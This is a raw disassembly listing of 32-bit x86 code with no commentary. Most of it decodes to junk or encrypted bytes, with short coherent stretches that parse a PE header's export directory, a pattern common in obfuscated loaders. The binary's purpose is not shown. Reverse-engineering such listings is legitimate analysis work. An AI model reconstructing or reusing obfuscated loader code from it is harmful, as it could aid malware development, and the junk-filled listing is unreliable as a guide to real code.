  406650:	repnz cld 
  406652:	outs   dx,DWORD PTR ds:[esi]
  406653:	sbb    ecx,DWORD PTR [esi-0x57]
  406656:	mov    esi,0xfbfd64af
  40665b:	xor    al,0xc3
  40665d:	mov    dl,0xed
  40665f:	push   ebx
  406660:	add    DWORD PTR [edx],edx
  406662:	jmp    0xbcaf:0x948f9217
  406669:	cmp    al,dh
  40666b:	mov    edx,esi
  40666d:	cmp    BYTE PTR [eax+0x333b71ca],0xeb
  406674:	jg     0x4066c8
  406676:	bound  edx,QWORD PTR [ebx+ecx*4+0x53]
  40667a:	add    al,0x35
  40667c:	ja     0x406633
  40667e:	jns    0x40664b
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0x18a920c
  4066b2:	inc    esp
  4066b3:	fnstsw WORD PTR [esi-0x424141c5]
  4066b9:	les    edi,FWORD PTR [esi-0x2d19da42]
  4066bf:	mov    bl,BYTE PTR [edx]
  4066c1:	test   DWORD PTR [ebp+ebx*8-0x20],edx
  4066c5:	pop    edi
  4066c7:	daa    
  4066c8:	inc    ebp
  4066c9:	call   0x68bab5e1
  4066ce:	pop    eax
  4066cf:	mov    dh,BYTE PTR [ebx+0x3133b66c]
  4066d5:	pop    esi
  4066d6:	sbb    DWORD PTR [ebx-0x74],0x24b16491
  4066dd:	(bad)  
  4066de:	xchg   ebp,eax
  4066df:	and    eax,0xcb88b25d
  4066e4:	sbb    edx,DWORD PTR [ebp+0x5ea9b488]
  4066ea:	bndstx [ebx+eiz*8-0x33],bnd0
  4066ef:	jb     0x40675f
  4066f1:	xor    ch,cl
  4066f3:	(bad)  
  4066f5:	ret    
  4066f6:	cwde   
  4066f7:	in     eax,0xec
  4066f9:	add    ecx,DWORD PTR [ecx+0x7371e598]
  4066ff:	pop    eax
  406700:	add    ebx,DWORD PTR [esi]
  406702:	loop   0x406779
  406704:	sbb    DWORD PTR [edx-0x6e7a5c20],0x16f076a2
  40670e:	rcr    DWORD PTR [ebx+0x5dce48ce],cl
  406714:	inc    eax
  406715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406716:	cs je  0x406712
  406719:	xor    eax,0x7ff772ef
  40671e:	lods   eax,DWORD PTR ds:[esi]
  40671f:	ja     0x4066b7
  406721:	push   edi
  406722:	mov    DWORD PTR [edx+0x7202a994],0x103b64c8
  40672c:	outs   dx,BYTE PTR ds:[esi]
  40672d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40672e:	or     eax,DWORD PTR [edi-0x23]
  406731:	or     eax,0x6bc402d1
  406736:	mov    ds:0xcc99fb4d,eax
  40673b:	das    
  40673c:	test   al,0xf6
  40673e:	in     al,0xb6
  406740:	fs jne 0x406745
  406743:	shl    DWORD PTR [ecx+0x3ce01daa],1
  406749:	pop    ebp
  40674a:	push   cs
  40674b:	fcom   QWORD PTR [ebx-0x59189df7]
  406751:	cwde   
  406752:	pop    edi
  406753:	inc    eax
  406754:	add    al,ah
  406756:	scas   al,BYTE PTR es:[edi]
  406757:	jb     0x4067a2
  406759:	inc    ebx
  40675a:	mov    edx,DWORD PTR [ecx+0x2fb88f0a]
  406760:	or     eax,0xdca8622e
  406765:	mov    ds:0x7e23a5cc,al
  40676a:	test   al,ch
  40676c:	ins    BYTE PTR es:[edi],dx
  40676d:	int3   
  40676e:	push   cs
  40676f:	add    al,0x3c
  406771:	pusha  
  406772:	sub    cl,al
  406774:	xor    eax,0x7a7eb792
  406779:	test   al,0x41
  40677b:	jmp    0x3d7d61c5
  406780:	add    ah,0x5e
  406783:	int3   
  406784:	stc    
  406785:	dec    ecx
  406786:	(bad)  
  406787:	addr16 not dh
  40678a:	jns    0x4067b2
  40678c:	jae    0x406764
  40678e:	sbb    eax,0xf2bfa290
  406793:	jnp    0x4067c6
  406795:	in     al,0x4f
  406797:	pop    ss
  406798:	pop    ss
  406799:	in     al,dx
  40679a:	mov    bh,0x81
  40679c:	xor    al,0xe4
  40679e:	lock xor ah,dl
  4067a1:	sbb    eax,0x1f4519d2
  4067a6:	test   al,0x54
  4067a8:	mov    al,0xd2
  4067aa:	push   cs
  4067ab:	push   ss
  4067ac:	mov    DWORD PTR [ecx-0x2a3d388f],edx
  4067b2:	pop    ecx
  4067b3:	inc    ebp
  4067b4:	test   BYTE PTR [ecx-0x46],bh
  4067b7:	ror    DWORD PTR [eax+0x3e],cl
  4067ba:	jbe    0x4067ff
  4067bc:	vpsllw xmm5,xmm5,XMMWORD PTR [eax]
  4067c0:	pushf  
  4067c1:	dec    esp
  4067c2:	int    0x5d
  4067c4:	cwde   
  4067c5:	lea    eax,[ebx-0x1]
  4067c8:	xor    ebx,ebp
  4067ca:	mov    esp,0x2ed4cb37
  4067cf:	aad    0x16
  4067d1:	sub    al,0xbd
  4067d3:	xlat   BYTE PTR ds:[ebx]
  4067d4:	or     eax,0xabba6203
  4067d9:	dec    edx
  4067da:	xor    BYTE PTR [ebp+0x51],bh
  4067dd:	cmp    eax,0xe859da7d
  4067e2:	stos   DWORD PTR es:[edi],eax
  4067e3:	shl    DWORD PTR [ebx+0x10],1
  4067e6:	xchg   edi,eax
  4067e7:	adc    eax,0x6d2818eb
  4067ec:	dec    ebp
  4067ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ee:	mov    ah,0x4d
  4067f0:	les    esi,FWORD PTR [edi+0x72]
  4067f3:	jne    0x406778
  4067f5:	xor    BYTE PTR [ecx+0x37a45437],al
  4067fb:	xor    bl,dh
  4067fd:	mov    al,0xa0
  4067ff:	mov    ds:0xcb2daea0,eax
  406804:	mov    al,0xbb
  406806:	mov    al,ds:0x591ef0a7
  40680b:	shl    DWORD PTR [esi],1
  40680d:	mov    eax,ds:0x79470f90
  406812:	loop   0x4067e7
  406814:	int    0x54
  406816:	inc    ecx
  406817:	popf   
  406818:	xor    esp,DWORD PTR [ecx-0x20]
  40681b:	mov    ebx,0xfbc22f0e
  406820:	dec    edx
  406821:	cmp    eax,0x82237f9
  406826:	aas    
  406827:	push   0xe0e5b521
  40682c:	mov    ecx,0x26c4e7bb
  406831:	imul   ecx,DWORD PTR [ebx+0x55d1a245],0x6e366412
  40683b:	loopne 0x406836
  40683d:	push   edx
  40683e:	sub    dh,BYTE PTR [eax+eiz*4-0x322240eb]
  406845:	mov    ds:0x546809c6,eax
  40684a:	les    esi,FWORD PTR [edi+0x700178c5]
  406850:	mov    dh,0x2
  406852:	push   0x1d
  406854:	aas    
  406855:	aaa    
  406856:	out    dx,eax
  406857:	sbb    ecx,DWORD PTR [ebp-0x75]
  40685a:	adc    al,0x72
  40685c:	in     eax,0x28
  40685e:	push   ebx
  40685f:	stos   BYTE PTR es:[edi],al
  406860:	mov    cl,bl
  406862:	cmp    eax,DWORD PTR [esi+0x75c8d197]
  406868:	aam    0xd7
  40686a:	xor    BYTE PTR [edi+0x6d],0xff
  40686e:	cwde   
  40686f:	inc    DWORD PTR [eax+0x9]
  406872:	mov    eax,ds:0x5eb54a8f
  406877:	sbb    bl,dh
  406879:	add    cl,BYTE PTR [edi]
  40687b:	xchg   ebx,eax
  40687c:	jp     0x40682c
  40687e:	test   cl,bl
  406880:	or     dl,BYTE PTR [eax+ebx*2]
  406883:	pusha  
  406884:	inc    ecx
  406885:	fidivr DWORD PTR [ebp+edx*4+0x5c]
  406889:	pop    ds
  40688a:	sub    DWORD PTR [esi+esi*8],esp
  40688d:	leave  
  40688e:	test   DWORD PTR [ebx-0x4bebb19f],ebx
  406894:	pop    esi
  406895:	mov    edi,0xa1d04c43
  40689a:	(bad)  
  40689b:	sbb    BYTE PTR [esi+0x15],dl
  40689e:	in     al,dx
  40689f:	sahf   
  4068a0:	adc    DWORD PTR [edi+0x92e5ecf],esi
  4068a6:	jecxz  0x40687d
  4068a8:	jg     0x4068bc
  4068aa:	mov    cl,0x77
  4068ac:	sahf   
  4068ad:	mov    al,0xb
  4068af:	cdq    
  4068b0:	(bad)  
  4068b1:	pop    ebp
  4068b2:	jp     0x406883
  4068b4:	rcr    DWORD PTR [ecx+0x3d58cfd4],0xc3
  4068bb:	gs sub al,0x39
  4068be:	push   0xd
  4068c0:	add    al,0x5d
  4068c2:	shr    al,cl
  4068c4:	mov    edi,0x75d631c0
  4068c9:	les    edi,FWORD PTR [edi]
  4068cb:	sbb    dl,BYTE PTR [edx-0x54]
  4068ce:	les    ebx,FWORD PTR [ecx-0x69]
  4068d1:	data16 das 
  4068d3:	out    0x64,al
  4068d5:	jg     0x4068cd
  4068d7:	fst    DWORD PTR [edi]
  4068d9:	test   al,0x9a
  4068db:	and    al,0x87
  4068dd:	pusha  
  4068de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068df:	push   ss
  4068e0:	dec    ebx
  4068e1:	retf   
  4068e2:	shl    DWORD PTR [edx-0x7b],1
  4068e5:	fsub   DWORD PTR [edi+edi*4+0x7b0e95f0]
  4068ec:	mov    ah,0xd7
  4068ee:	call   0x94a3:0xc87be7b2
  4068f5:	jecxz  0x406941
  4068f7:	cmp    al,0xd3
  4068f9:	xchg   ebx,eax
  4068fa:	add    BYTE PTR [eax-0x6d4cc27f],0x33
  406901:	in     al,0x56
  406903:	xchg   esp,eax
  406904:	mov    ds:0x855ffde5,al
  406909:	je     0x4068aa
  40690b:	mov    cl,0xd5
  40690d:	jae    0x40698b
  40690f:	jb     0x4068b9
  406911:	retf   
  406912:	add    cl,cl
  406914:	(bad)  
  406915:	push   esi
  406916:	push   ds
  406917:	clc    
  406918:	fimul  DWORD PTR [ecx]
  40691a:	cmovb  edx,DWORD PTR [ebx-0x3d]
  40691e:	(bad)  
  40691f:	retf   0xb098
  406922:	arpl   WORD PTR [ebx-0x6bc1dfce],dx
  406928:	pop    eax
  406929:	jmp    0x4068b9
  40692b:	fwait
  40692c:	dec    edx
  40692d:	mov    al,ds:0x1473e8a3
  406932:	jo     0x4068c2
  406934:	mov    eax,0x1df8f52e
  406939:	jnp    0x406950
  40693b:	dec    edx
  40693c:	daa    
  40693d:	std    
  40693e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40693f:	or     ecx,edx
  406941:	sbb    DWORD PTR [ebp-0x2eb6ca18],0x47
  406948:	adc    edi,0x4765255a
  40694e:	dec    edx
  40694f:	dec    ecx
  406950:	out    dx,al
  406951:	dec    ebx
  406952:	add    DWORD PTR [edi-0x639e72d0],0x2
  406959:	xor    eax,0x5081649c
  40695e:	pop    es
  40695f:	xchg   esp,eax
  406960:	or     esp,DWORD PTR [edx+0x63fb4bfc]
  406966:	xchg   esi,eax
  406967:	mov    edx,0x2c0f3881
  40696c:	push   es
  40696d:	mov    al,BYTE PTR [ebx+ebp*1-0x69b03c3c]
  406974:	add    BYTE PTR [edx-0x121dffb6],bh
  40697a:	fist   DWORD PTR [ebp+0x1]
  40697d:	adc    BYTE PTR [edx+0x66],0x5d
  406981:	in     eax,dx
  406982:	rcl    esp,cl
  406984:	fisub  WORD PTR [ecx-0x42]
  406987:	fidivr WORD PTR [ebp+0x61]
  40698a:	xchg   ebp,eax
  40698b:	xchg   esi,eax
  40698c:	ret    0x8914
  40698f:	mov    eax,0xb3e60eba
  406994:	jo     0x40694a
  406996:	ins    DWORD PTR es:[edi],dx
  406997:	fnstcw WORD PTR [ecx]
  406999:	test   bh,0x1f
  40699c:	test   eax,0xb4f187b8
  4069a1:	lea    eax,ds:[eax-0x42]
  4069a5:	mov    esp,ss
  4069a7:	(bad)  
  4069a8:	mov    cl,0xe7
  4069aa:	cld    
  4069ab:	out    dx,eax
  4069ac:	xlat   BYTE PTR ds:[ebx]
  4069ad:	pop    ds
  4069ae:	adc    al,0x5c
  4069b0:	fcomp  st(0)
  4069b2:	sub    bl,BYTE PTR [ecx]
  4069b4:	pushf  
  4069b5:	aam    0x5d
  4069b7:	sub    esp,DWORD PTR [edi+edx*1-0x6791fcf1]
  4069be:	add    bl,0xdc
  4069c1:	call   0xb543:0x8f38acbe
  4069c8:	call   0x1fa61a06
  4069cd:	shr    DWORD PTR [esi+ebp*4],0x13
  4069d1:	push   edx
  4069d2:	out    dx,eax
  4069d3:	sbb    DWORD PTR [ebx+0x5ddfc8a5],edx
  4069d9:	adc    BYTE PTR [edx+0x21685a7a],dh
  4069df:	mov    esp,0x9535c2e3
  4069e4:	add    eax,0x14e98050
  4069e9:	or     BYTE PTR [eax],al
  4069eb:	push   0x23
  4069ed:	adc    esi,DWORD PTR [eax]
  4069ef:	es pop eax
  4069f1:	repnz add eax,0x8281f520
  4069f7:	aaa    
  4069f8:	(bad)  
  4069f9:	jno    0x406a71
  4069fb:	pop    es
  4069fc:	and    bh,BYTE PTR [ecx+0x5e]
  4069ff:	push   cs
  406a00:	test   al,0xe3
  406a02:	jle    0x406a4e
  406a04:	mov    ebx,0x7c8c7675
  406a09:	arpl   WORD PTR [edi+0x51a0adbd],dx
  406a0f:	cld    
  406a10:	and    DWORD PTR [eax],esp
  406a12:	inc    eax
  406a13:	(bad)
  406a16:	cld    
  406a17:	add    esp,DWORD PTR [edi+0x6e0aef8b]
  406a1d:	aam    0x7e
  406a1f:	leave  
  406a20:	shl    DWORD PTR ds:0x2719716c,1
  406a26:	xchg   ebp,eax
  406a27:	sub    edx,eax
  406a29:	xchg   edi,eax
  406a2a:	jl     0x4069b5
  406a2c:	call   0x8a4:0x8e455b0d
  406a33:	jmp    0x4069c9
  406a35:	mov    bl,0x4a
  406a37:	cmc    
  406a38:	std    
  406a39:	inc    ebx
  406a3a:	push   eax
  406a3b:	jecxz  0x406a6d
  406a3d:	sti    
  406a3e:	ret    0x89f4
  406a41:	inc    ebp
  406a42:	xchg   esp,eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	cmp    BYTE PTR [edx+0x41bdcf80],bl
  406ac3:	mov    esi,0xbec4bdbe
  406ac8:	mov    esi,0xc1bf076d
  406acd:	add    dh,BYTE PTR [eax+0x71596fbe]
  406ad3:	paddd  mm3,QWORD PTR [ebp-0x2f]
  406ad7:	jmp    0xd8219d38
  406adc:	push   ss
  406add:	xchg   DWORD PTR [edx+0x61],eax
  406ae0:	sbb    bl,BYTE PTR [ecx+0x399869d9]
  406ae6:	inc    edi
  406ae7:	xor    BYTE PTR [edi-0xa7d9fd8],cl
  406aed:	xchg   ebp,eax
  406aee:	shr    esi,1
  406af0:	clc    
  406af1:	adc    ah,BYTE PTR [esi]
  406af3:	jmp    0xbf7c:0xe0247d95
  406afa:	out    0x55,eax
  406afc:	ds sbb ebp,0xffffffee
  406b00:	push   es
  406b01:	scas   eax,DWORD PTR es:[edi]
  406b02:	std    
  406b03:	pop    ss
  406b04:	jae    0x406ac4
  406b06:	push   cs
  406b07:	jbe    0x406b10
  406b09:	(bad)  
  406b0a:	jno    0x406b7d
  406b0c:	(bad)
  406b0f:	jns    0x406b47
  406b11:	xlat   BYTE PTR ds:[ebx]
  406b12:	imul   edx,DWORD PTR [ecx],0xffffff9e
  406b15:	jmp    0xbb3:0xf8cd29a
  406b1c:	ret    
  406b1d:	cmp    DWORD PTR [ebx+0x36d18e28],esi
  406b23:	sbb    eax,0x107ad2fc
  406b28:	xchg   edx,eax
  406b29:	fidivr DWORD PTR [ecx-0x3571702d]
  406b2f:	pop    ds
  406b30:	loopne 0x406b78
  406b32:	(bad)  
  406b34:	sub    al,0x5d
  406b36:	lea    ecx,[ebp-0x76]
  406b39:	xchg   DWORD PTR [ecx+ebp*1+0x735d6009],edi
  406b40:	xor    dh,cl
  406b42:	mov    cl,0xad
  406b44:	adc    DWORD PTR [ecx+0x7d],edi
  406b47:	mov    BYTE PTR [esi+0x6d],al
  406b4a:	mov    ebp,0x3cc99e3a
  406b4f:	int3   
  406b50:	das    
  406b51:	mov    ebp,?
  406b53:	add    al,0x6
  406b55:	push   esi
  406b56:	mov    ecx,es
  406b58:	pushf  
  406b59:	cmp    DWORD PTR [edx],edx
  406b5b:	pop    ebp
  406b5c:	pop    es
  406b5d:	bound  eax,QWORD PTR [ebx-0x5a]
  406b60:	sbb    eax,0x79d28e57
  406b65:	pop    ecx
  406b66:	cmp    ecx,DWORD PTR [edi+esi*8-0x1eb26258]
  406b6d:	rcl    BYTE PTR [esi-0x1ad85324],cl
  406b73:	push   edx
  406b74:	dec    edi
  406b75:	rol    DWORD PTR ds:0xa8fb3ad,1
  406b7b:	jb     0x406b6a
  406b7d:	xlat   BYTE PTR ds:[ebx]
  406b7e:	into   
  406b7f:	shl    BYTE PTR [eax-0x5a],1
  406b82:	and    eax,edi
  406b84:	rcl    eax,1
  406b86:	adc    bl,BYTE PTR [ecx+0x5c]
  406b89:	cmp    eax,0x89968f91
  406b8e:	xor    bh,dl
  406b90:	and    eax,0x7985f947
  406b95:	test   DWORD PTR [edi+0x16eaaa3d],esp
  406b9b:	push   ss
  406b9c:	add    dh,BYTE PTR [esi]
  406b9e:	push   cs
  406b9f:	mov    ecx,esp
  406ba1:	sar    BYTE PTR [ecx],0xd8
  406ba4:	or     BYTE PTR [esi],0xc3
  406ba7:	pop    eax
  406ba8:	pushf  
  406ba9:	dec    edx
  406baa:	popa   
  406bab:	push   0xfffffffd
  406bad:	scas   al,BYTE PTR es:[edi]
  406bae:	fwait
  406baf:	add    DWORD PTR [esi-0xd],ebx
  406bb2:	or     al,0x8f
  406bb4:	sub    ebp,DWORD PTR [ebp+0x16]
  406bb7:	loopne 0x406baf
  406bb9:	hlt    
  406bba:	shr    BYTE PTR [edi-0x79],1
  406bbd:	xor    al,0x29
  406bbf:	jge    0x406bcc
  406bc1:	cdq    
  406bc2:	ss jp  0x406c20
  406bc5:	sbb    ebp,edx
  406bc7:	mov    dl,0xf1
  406bc9:	pop    esi
  406bca:	retf   0x42e2
  406bcd:	sub    BYTE PTR [edx-0x3d9ec38],al
  406bd3:	jge    0x406c23
  406bd5:	add    al,0xf3
  406bd7:	xchg   edi,eax
  406bd8:	sub    bl,bl
  406bda:	jmp    0x8279224d
  406bdf:	int    0x29
  406be1:	push   cs
  406be2:	pushf  
  406be3:	ja     0x406b78
  406be5:	add    edi,edx
  406be7:	cld    
  406be8:	fsubp  st(5),st
  406bea:	js     0x406c54
  406bec:	ins    DWORD PTR es:[edi],dx
  406bed:	jge    0x406c6e
  406bef:	dec    ecx
  406bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf1:	mov    bl,0xf6
  406bf3:	jbe    0x406b84
  406bf5:	nop
  406bf6:	xor    DWORD PTR [edx-0x72533f86],0x7870cba0
  406c00:	stos   DWORD PTR es:[edi],eax
  406c01:	jmp    0x598:0xc584c280
  406c08:	imul   ebp,DWORD PTR [eax],0x31
  406c0b:	dec    esi
  406c0c:	loop   0x406c0b
  406c0e:	mov    ebp,0x30997086
  406c13:	adc    al,0xce
  406c15:	pop    esp
  406c16:	ja     0x406bd6
  406c18:	inc    ebx
  406c19:	lea    esi,[eax]
  406c1b:	cdq    
  406c1c:	and    eax,0xa3f9de6c
  406c21:	aas    
  406c22:	test   DWORD PTR [esi+0x30],esp
  406c25:	inc    ebp
  406c26:	iret   
  406c27:	repz fld TBYTE PTR [edi]
  406c2a:	mov    esi,0x3febe5db
  406c2f:	scas   al,BYTE PTR es:[edi]
  406c30:	cmp    ebx,ebp
  406c32:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406c34:	sub    esi,DWORD PTR [esi+0x5fc9c798]
  406c3a:	sbb    BYTE PTR [edx-0x52590f25],al
  406c40:	lahf   
  406c41:	add    bh,BYTE PTR [edi-0x38]
  406c44:	mov    WORD PTR [edx],cs
  406c46:	hlt    
  406c47:	loopne 0x406c16
  406c49:	xor    al,0x20
  406c4b:	jle    0x406bed
  406c4d:	fldcw  WORD PTR [edi+0x1b90d9e9]
  406c53:	push   ebx
  406c54:	shl    BYTE PTR cs:[ecx],1
  406c57:	mov    ebp,0x13922909
  406c5c:	adc    DWORD PTR [esi+0x76],edi
  406c5f:	sbb    DWORD PTR [ebx+0xfb6e308],edx
  406c65:	outs   dx,BYTE PTR ds:[esi]
  406c66:	or     eax,0x20c87f14
  406c6b:	pushw  es
  406c6d:	fdiv   QWORD PTR [eax]
  406c6f:	jo     0x406c7f
  406c71:	inc    esi
  406c72:	cwde   
  406c73:	inc    ebp
  406c74:	imul   esi,DWORD PTR [ecx+edx*1+0x37a8a91e],0x23
  406c7c:	fstp   DWORD PTR [ebx]
  406c7e:	int3   
  406c7f:	retf   0xdba9
  406c82:	or     esi,DWORD PTR [eax-0x3a]
  406c85:	pop    eax
  406c86:	outs   dx,DWORD PTR ds:[esi]
  406c87:	out    0xb,al
  406c89:	punpcklbw mm3,DWORD PTR [edx]
  406c8c:	icebp  
  406c8d:	aas    
  406c8e:	and    BYTE PTR cs:[ecx+0x7982d172],bh
  406c95:	and    bh,BYTE PTR [esi-0x50]
  406c98:	aam    0x74
  406c9a:	jge    0x406c88
  406c9c:	adc    edi,DWORD PTR [edx-0x51]
  406c9f:	aam    0xf9
  406ca1:	mov    al,ds:0xa04eba8f
  406ca6:	in     al,0xbf
  406ca8:	mov    ebp,0x5f533e8
  406cad:	ins    BYTE PTR es:[edi],dx
  406cae:	pusha  
  406caf:	jne    0x406cce
  406cb1:	scas   al,BYTE PTR es:[edi]
  406cb2:	fst    DWORD PTR [edx]
  406cb4:	nop
  406cb5:	cmp    al,BYTE PTR [edx]
  406cb7:	shl    BYTE PTR [eax],1
  406cb9:	popa   
  406cba:	out    0x5e,al
  406cbc:	btc    DWORD PTR [eax-0x18],esp
  406cc0:	iret   
  406cc1:	push   esi
  406cc2:	push   ds
  406cc3:	jle    0x406c63
  406cc5:	dec    ebp
  406cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cc7:	popf   
  406cc8:	dec    ebx
  406cc9:	cmp    BYTE PTR ds:0xf467f086,al
  406ccf:	test   al,0xeb
  406cd1:	aam    0xa4
  406cd3:	push   cs
  406cd4:	cld    
  406cd5:	push   0xa7ae3902
  406cda:	jmp    0x953e8d44
  406cdf:	in     al,0xa1
  406ce1:	and    eax,0x8bbdfb38
  406ce6:	add    ecx,DWORD PTR [ecx]
  406ce8:	xor    bh,bh
  406cea:	push   cs
  406ceb:	xor    ebp,eax
  406ced:	shl    BYTE PTR [ebp+0x5a],0x2c
  406cf1:	sub    bh,BYTE PTR [ebx+0x17afa0ec]
  406cf7:	in     eax,0xdc
  406cf9:	and    al,0x3f
  406cfb:	aaa    
  406cfc:	mov    ah,0x89
  406cfe:	call   0x6613:0xae2f6e69
  406d05:	loop   0x406d69
  406d07:	rol    BYTE PTR fs:0x65c90316,1
  406d0e:	cwde   
  406d0f:	xor    al,0xf7
  406d11:	sub    esp,ebx
  406d13:	fsub   QWORD PTR [edx]
  406d15:	mov    eax,ebp
  406d17:	mov    ecx,0xa2f3368a
  406d1c:	mov    esi,0x4942e7cb
  406d21:	lods   eax,DWORD PTR ds:[esi]
  406d22:	add    DWORD PTR [eax+0x78],esp
  406d25:	fnsave [edi-0x64]
  406d28:	jb     0x406d43
  406d2a:	(bad)  
  406d2b:	mov    bl,0x6a
  406d2d:	enter  0x3dab,0xab
  406d31:	das    
  406d32:	pop    esi
  406d33:	mov    ?,WORD PTR [edx-0x41e0743b]
  406d39:	fild   QWORD PTR [edx-0x53436e65]
  406d3f:	out    dx,al
  406d40:	xor    dl,ah
  406d42:	xchg   esp,eax
  406d43:	loopne 0x406daf
  406d45:	mov    cs,WORD PTR [eax-0x5acc71db]
  406d4b:	div    bl
  406d4d:	inc    edi
  406d4e:	push   edi
  406d4f:	retf   
  406d50:	adc    DWORD PTR [ebx],esi
  406d52:	sub    ecx,DWORD PTR [ebp-0x4b]
  406d55:	and    BYTE PTR [ebp+0x52],cl
  406d58:	jae    0x406d95
  406d5a:	imul   ecx,ebx,0xffffffd2
  406d5d:	pop    ebp
  406d5e:	and    ah,BYTE PTR [edx]
  406d60:	jle    0x406d16
  406d62:	sbb    eax,0x8b73dc79
  406d67:	or     eax,0x50ebec9b
  406d6c:	adc    ah,0xcd
  406d6f:	scas   al,BYTE PTR es:[edi]
  406d70:	jno    0x406d11
  406d72:	pop    eax
  406d73:	mov    bl,0xd8
  406d75:	in     al,0x46
  406d77:	test   DWORD PTR [ecx-0x28],0x950494c1
  406d7e:	add    esi,DWORD PTR [edi-0x51373722]
  406d84:	arpl   ax,si
  406d86:	sub    DWORD PTR [ebp+0x6b66988f],esi
  406d8c:	out    0xc,al
  406d8e:	inc    eax
  406d8f:	xchg   ebp,eax
  406d90:	jge    0x406d35
  406d92:	fsub   DWORD PTR [ebx-0x28e9c500]
  406d98:	jns    0x406d46
  406d9a:	test   DWORD PTR [ebx-0x22],0xc12d520c
  406da1:	dec    ebx
  406da2:	aaa    
  406da3:	sub    eax,0x1ddde3d
  406da8:	mov    ebx,0x8e477e88
  406dad:	inc    ecx
  406dae:	jg     0x406e0e
  406db0:	adc    ah,BYTE PTR ds:[esi+0x1a]
  406db4:	cmc    
  406db5:	add    eax,esi
  406db7:	hlt    
  406db8:	lock loope 0x406d91
  406dbb:	dec    esi
  406dbc:	or     ah,BYTE PTR ss:[ebx+0x14]
  406dc0:	jl     0x406e0d
  406dc2:	xor    al,0x77
  406dc4:	mov    ds:0x46efb8f,eax
  406dc9:	neg    DWORD PTR [ecx]
  406dcb:	shl    dl,1
  406dcd:	stos   DWORD PTR es:[edi],eax
  406dce:	scas   al,BYTE PTR es:[edi]
  406dcf:	cli    
  406dd0:	push   0x631cded5
  406dd5:	dec    ecx
  406dd6:	xchg   BYTE PTR ds:0x96a8cc78,bh
  406ddc:	out    dx,al
  406ddd:	jp     0x406dc8
  406ddf:	jne    0x406e15
  406de1:	jae    0x406e48
  406de3:	rol    dh,0x86
  406de6:	loope  0x406db3
  406de8:	push   ds
  406de9:	lods   al,BYTE PTR ds:[esi]
  406dea:	test   eax,0x358c2e32
  406def:	aad    0x4b
  406df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406df2:	out    dx,al
  406df3:	bound  esi,QWORD PTR [ecx-0x3ab22f66]
  406df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dfa:	nop
  406dfb:	cmp    BYTE PTR [edx+0x40d41234],0xea
  406e02:	inc    ebp
  406e03:	stos   BYTE PTR es:[edi],al
  406e04:	xchg   esi,eax
  406e05:	push   ss
  406e06:	add    edx,DWORD PTR [ecx+0x65]
  406e09:	add    DWORD PTR [esp+ebp*8+0x274adbbe],ecx
  406e10:	imul   ebx,DWORD PTR [ebp+0x1],0xcdff23e
  406e17:	dec    esp
  406e18:	dec    edi
  406e19:	add    DWORD PTR [esi],ebp
  406e1b:	jns    0x406da3
  406e1d:	push   ebx
  406e1e:	cld    
  406e1f:	or     bl,dh
  406e21:	nop
  406e22:	and    eax,0xcd380dd5
  406e27:	in     al,dx
  406e28:	imul   edi,DWORD PTR ds:0x292e2a24,0xbceb5b4b
  406e32:	in     eax,dx
  406e33:	(bad)  
  406e35:	xor    eax,0x8a422c6b
  406e3a:	adc    edi,DWORD PTR [ebp+0xc]
  406e3d:	mov    ch,0x49
  406e3f:	ss inc dh
  406e42:	rcr    ch,0x32
  406e45:	or     DWORD PTR [eax+edx*8],0xffffff91
  406e49:	enter  0xf127,0x31
